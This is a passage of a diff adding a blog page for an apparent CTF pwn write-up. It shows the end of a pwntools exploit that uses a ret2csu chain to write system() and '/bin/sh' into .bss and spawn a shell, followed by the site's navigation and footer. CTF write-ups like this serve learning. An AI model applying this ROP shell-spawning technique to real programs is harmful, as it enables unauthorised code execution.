class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=<span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">payload=ret_csu(read_got,<span class="number">0</span>,bss_addr,<span class="number">18</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line">io.sendline(p64(system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=ret_csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220619213844860.png" alt="image-20220619213844860" style="zoom:80%;" />
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/06/21/pwn/%E6%A0%88%E5%AF%B9%E9%BD%90/" rel="prev" title="栈对齐">
+                  <i class="fa fa-angle-left"></i> 栈对齐
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/06/21/pwn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA(%E6%9C%AC%E5%9C%B0%E3%80%81%E5%A4%8D%E7%8E%B0)/" rel="next" title="复现题目环境的搭建">
+                  复现题目环境的搭建 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">vi0let</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/vi0let-coder" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
